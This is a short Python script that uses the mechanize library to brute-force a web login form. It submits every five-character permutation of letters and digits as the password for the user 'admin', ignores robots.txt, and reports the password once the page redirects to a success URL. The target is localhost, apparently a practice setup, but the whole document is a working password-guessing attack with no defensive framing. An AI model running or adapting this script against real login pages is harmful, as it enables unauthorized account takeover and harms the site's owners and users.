#!/usr/bin/python
import mechanize 
import itertools

br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)

combos = itertools.permutations("qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890",5) 
br.open("http://localhost/main.html")
for form in br.forms():
    if form.attrs['id'] == 'form':
        formUsed=form
        break

for x in combos:
    br.form=formUsed
    br.form["name"] = "admin"
    br.form["password"] = ''.join(x)
    print "Checking ",br.form['password']
    response=br.submit()
    if response.geturl()=="http://localhost/correct_pass.htm":
        #url to which the page is redirected after login
        print "Correct password is ",''.join(x)
        break